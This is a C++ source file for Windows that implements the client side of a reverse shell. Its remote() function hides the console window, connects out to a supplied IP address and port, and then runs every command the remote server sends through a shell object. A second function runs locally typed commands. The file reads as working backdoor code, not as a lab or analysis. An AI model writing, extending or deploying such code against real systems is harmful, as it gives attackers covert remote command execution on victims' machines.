#include <iostream>
#include <cstring>
#include <winsock2.h>
#include <Windows.h>
#include <string>
#include "Shell.h"
#include "Config.h"
#include "AutoSocket.h"

#pragma comment(lib, "ws2_32.lib")

int remote(std::string IpAddress) {
    FreeConsole();
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return -1;
    }

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return -1;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT); 
    serverAddr.sin_addr.s_addr = inet_addr(IpAddress.c_str());
    AutoSocket Socket(clientSocket);

    if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) 
        return -1;
    
    // Connection established with server , create RemoteShell 
    RemoteShell shell(clientSocket);

    // Process commands from server 
    char UserInput[MAX_COMMAND_SIZE] = { 0 };
    while (true)
    {
       
       if (recv(clientSocket, UserInput, sizeof(UserInput), 0) == SOCKET_ERROR)
             break;
       shell.ExecCommand(UserInput);
       memset(UserInput, 0, sizeof(UserInput));
    }
    
    return 0;
}


void local()
{
    std::string UserInput;

    LocalShell shell;

    while (true)
    {
        std::getline(std::cin, UserInput);
        shell.ExecCommand(UserInput);
    }
}